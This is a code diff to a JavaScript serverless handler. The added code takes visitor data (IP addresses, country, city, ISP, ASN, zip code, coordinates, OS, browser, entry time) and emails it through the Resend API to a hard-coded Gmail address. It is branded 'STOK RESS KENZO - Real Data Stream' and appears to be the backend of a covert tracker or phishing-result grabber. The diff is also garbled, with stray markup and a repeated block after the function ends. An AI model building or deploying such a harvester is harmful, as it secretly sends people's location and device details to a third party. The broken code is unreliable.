@@ -12,6 +12,8 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: "Method not allowed" });
     }
 
+    const API_KEY = process.env.RESEND_API_KEY;
+
     try {
         const d = req.body;
 
@@ -35,6 +37,50 @@ export default async function handler(req, res) {
                 <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">OS</td><td style="padding:10px">${d.os || "-"}</td></tr>
                 <tr><td style="padding:10px;font-weight:bold">BROWSER</td><td style="padding:10px">${d.browser || "-"}</td></tr>
               </table>
+
+              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
+              <table style="width:100%;font-size:14px;border-collapse:collapse">
+                <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${d.negara || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROPINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">PROVIDER</td><td style="padding:10px">${d.isp || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ASN</td><td style="padding:10px">${d.asn || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">ZIP CODE</td><td style="padding:10px">${d.zip || "-"}</td></tr>
+                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">LAT , LONG</td><td style="padding:10px">${d.koord || "-"}</td></tr>
+                <tr><td style="padding:10px;font-weight:bold">JAM MASUK</td><td style="padding:10px">${d.waktu || "-"}</td></tr>
+              </table>
+            </div>
+            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">
+              STOK RESS KENZO - Real Data Stream
+            </div>
+          </div>
+        </div>`;
+
+        const response = await fetch("https://api.resend.com/emails", {
+            method: "POST",
+            headers: {
+                "Authorization": "Bearer " + API_KEY,
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                from: "STOK RESS KENZO <onboarding@resend.dev>",
+                to: ["medikaputra5@gmail.com"],
+                subject: "🕵️ STOK RESS KENZO 🕵️",
+                html: htmlBody
+            })
+        });
+
+        const data = await response.json();
+
+        return res.status(response.status).json(data);
+
+    } catch (error) {
+        return res.status(500).json({ error: error.message });
+    }
+}              </table>
 
               <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
               <table style="width:100%;font-size:14px;border-collapse:collapse">
